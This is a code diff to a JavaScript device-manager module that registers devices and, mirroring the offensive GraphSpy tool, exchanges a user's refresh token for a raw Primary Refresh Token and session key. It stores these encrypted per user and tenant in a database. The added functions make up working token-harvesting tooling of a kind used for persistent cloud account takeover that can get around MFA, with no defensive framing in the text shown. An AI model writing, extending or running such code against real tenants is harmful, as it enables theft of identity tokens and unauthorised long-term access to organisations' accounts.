@@ -603,6 +603,112 @@ async function getPrtCookie(clientAssertion, refreshToken, tenantId) {
 }
 
 /**
+ * GraphSpy prt.request_for_device() - Slice C.
+ *
+ * Exchanges the user's refresh token for the RAW PRT + session_key_jwe using
+ * a device-signed JWT (RS256 + x5c, kdf_ver 2). This is the only source of
+ * the session key; without it the KDF cookie (x-ms-RefreshTokenCredential)
+ * and PRT->access-token flows cannot run.
+ *
+ * Non-fatal wrapper: returns null fields on failure so callers can fall back
+ * to the legacy Set-Cookie cookie path.
+ *
+ * @param {object} p - { refreshToken, privateKeyPem, certificateBase64 }
+ *   certificateBase64 may be base64 DER or PEM (prtkdf normalizes both).
+ * @returns {Promise<{prt: string|null, sessionKeyJwe: string|null, sessionKeyHex: string|null}>}
+ */
+async function capturePrtViaRequestForDevice({ refreshToken, privateKeyPem, certificateBase64 }) {
+  const empty = { prt: null, sessionKeyJwe: null, sessionKeyHex: null };
+  if (!refreshToken || !privateKeyPem || !certificateBase64) return empty;
+  try {
+    const prtkdf = require('./prtkdf');
+    const result = await prtkdf.requestPrtForDevice({
+      refreshToken,
+      privateKeyPem,
+      certificateBase64,
+    });
+    console.log('[DeviceManager] request_for_device captured raw PRT + session key (GraphSpy parity)');
+    return {
+      prt: result.prt || null,
+      sessionKeyJwe: result.sessionKeyJwe || null,
+      sessionKeyHex: result.sessionKeyHex || null,
+    };
+  } catch (err) {
+    console.warn('[DeviceManager] request_for_device failed (non-fatal):', err.message);
+    return empty;
+  }
+}
+
+/**
+ * Upsert the device_credentials row for user+tenant and store the
+ * GraphSpy session key (encrypted, hex of the raw 32-byte key).
+ *
+ * A bare "UPDATE device_credentials ..." silently stores nothing when the
+ * row does not exist yet (the broker-enrollment path never creates it),
+ * which loses the session key forever. This helper creates the row from the
+ * DRS device material when missing and updates it otherwise.
+ *
+ * @param {number|string} userId
+ * @param {string} tenantId
+ * @param {string|null} sessionKeyHex - raw session key (hex) to store
+ * @param {object} [deviceMaterial] - { deviceId, deviceCertificate (PEM), privateKeyPem, certificateDerBase64 }
+ * @returns {Promise<{created: boolean}>}
+ */
+async function persistPrtSessionKey(userId, tenantId, sessionKeyHex, deviceMaterial = {}) {
+  if (!userId || !tenantId) {
+    throw new Error('persistPrtSessionKey requires userId and tenantId');
+  }
+  const [rows] = await db.query(
+    'SELECT id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
+    [userId, tenantId]
+  );
+
+  if (rows.length > 0) {
+    const sets = [];
+    const params = [];
+    if (sessionKeyHex) { sets.push('session_key_encrypted = ?'); params.push(encrypt(sessionKeyHex)); }
+    if (deviceMaterial.deviceId) { sets.push('device_id = ?'); params.push(deviceMaterial.deviceId); }
+    if (deviceMaterial.deviceCertificate) { sets.push('device_certificate_encrypted = ?'); params.push(encrypt(deviceMaterial.deviceCertificate)); }
+    if (deviceMaterial.privateKeyPem) { sets.push('encrypted_private_key = ?'); params.push(encrypt(deviceMaterial.privateKeyPem)); }
+    if (deviceMaterial.certificateDerBase64) { sets.push('certificate_der_base64 = ?'); params.push(deviceMaterial.certificateDerBase64); }
+    if (sets.length === 0) return { created: false };
+    params.push(userId, tenantId);
+    await db.query(
+      `UPDATE device_credentials SET ${sets.join(', ')} WHERE user_id = ? AND tenant_id = ?`,
+      params
+    );
+    return { created: false };
+  }
+
+  // Row missing - create it from the DRS device material. device_id and
+  // encrypted_private_key are NOT NULL columns, so creation is only
+  // possible when the material was provided.
+  if (!deviceMaterial.deviceId || !deviceMaterial.privateKeyPem) {
+    console.warn('[DeviceManager] persistPrtSessionKey: no device_credentials row and insufficient device material to create one (userId=' + userId + ', tenant=' + tenantId + ')');
+    return { created: false };
+  }
+  await db.query(
+    `INSERT INTO device_credentials
+     (user_id, tenant_id, device_id, device_certificate_encrypted, certificate_der_base64,
+      encrypted_private_key, prt_cookie_encrypted, session_key_encrypted, user_principal_name)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+    [
+      userId,
+      tenantId,
+      deviceMaterial.deviceId,
+      deviceMaterial.deviceCertificate ? encrypt(deviceMaterial.deviceCertificate) : null,
+      deviceMaterial.certificateDerBase64 || null,
+      encrypt(deviceMaterial.privateKeyPem),
+      null,
+      sessionKeyHex ? encrypt(sessionKeyHex) : null,
+      '',
+    ]
+  );
+  console.log('[DeviceManager] Device credentials row created (userId=' + userId + ', tenant=' + tenantId + ', device=' + deviceMaterial.deviceId + ')');
+  return { created: true };
+}
+
+/**
  * Full device registration and PRT generation flow
  *
  * tokenData:
@@ -623,17 +729,33 @@ async function registerDeviceAndGetPrt(tokenData) {
       try {
         const freshCookie = await refreshPrtCookie(user_id, tenant_id, refresh_token);
         const [credRows] = await db.query(
-          'SELECT device_id, device_certificate_encrypted, encrypted_private_key FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
+          'SELECT device_id, device_certificate_encrypted, encrypted_private_key, certificate_der_base64, session_key_encrypted FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
           [user_id, tenant_id]
         );
         if (credRows.length > 0) {
+          // GraphSpy parity: when no session key is stored yet, capture it
+          // now via the device-signed request_for_device call (Slice C).
+          const storedPrivateKey = decrypt(credRows[0].encrypted_private_key);
+          const storedCertificate = credRows[0].certificate_der_base64
+            || decrypt(credRows[0].device_certificate_encrypted);
+          const prtMaterial = credRows[0].session_key_encrypted
+            ? { prt: null, sessionKeyJwe: null, sessionKeyHex: null }
+            : await capturePrtViaRequestForDevice({
+                refreshToken: refresh_token,
+                privateKeyPem: storedPrivateKey,
+                certificateBase64: storedCertificate,
+              });
           return {
             deviceId: credRows[0].device_id,
             deviceCertificate: decrypt(credRows[0].device_certificate_encrypted),
             certificateThumbprint: null,
+            certificateDerBase64: credRows[0].certificate_der_base64 || null,
             prtCookie: freshCookie,
-            privateKey: decrypt(credRows[0].encrypted_private_key),
-            tenantId: tenant_id
+            privateKey: storedPrivateKey,
+            tenantId: tenant_id,
+            prt: prtMaterial.prt,
+            sessionKeyJwe: prtMaterial.sessionKeyJwe,
+            sessionKeyHex: prtMaterial.sessionKeyHex
           };
         }
       } catch (err) {
@@ -765,6 +887,15 @@ async function registerDeviceAndGetPrt(tokenData) {
     throw new Error(`PRT cookie exchange failed: ${err.message}`);
   }
 
+  // Step 5b: GraphSpy prt.request_for_device() (Slice C) - capture the raw
+  // PRT + session_key_jwe with the device-signed JWT. Non-fatal: the legacy
+  // Set-Cookie cookie above remains the prtCookie field.
+  const prtMaterial = await capturePrtViaRequestForDevice({
+    refreshToken: refresh_token,
+    privateKeyPem,
+    certificateBase64: drsDerBase64 || registrationResult.deviceCertificate,
+  });
+
   // Step 6: Update stored PRT cookie if we stored credentials above
   if (user_id !== null && user_id !== undefined && tenant_id) {
     try {
@@ -785,7 +916,11 @@ async function registerDeviceAndGetPrt(tokenData) {
     certificateDerBase64: registrationResult.certificateDerBase64 || null,
     prtCookie: prtCookie,
     privateKey: privateKeyPem,
-    tenantId: registrationResult.tenantId
+    tenantId: registrationResult.tenantId,
+    // GraphSpy Slice C results (null when request_for_device failed)
+    prt: prtMaterial.prt,
+    sessionKeyJwe: prtMaterial.sessionKeyJwe,
+    sessionKeyHex: prtMaterial.sessionKeyHex
   };
 }
 
@@ -1069,5 +1204,7 @@ module.exports = {
   extractTenantFromAccessToken,
   exchangeForDrsToken,
   capturePrtSessionKey,
-  getStoredSessionKey
+  getStoredSessionKey,
+  capturePrtViaRequestForDevice,
+  persistPrtSessionKey
 };
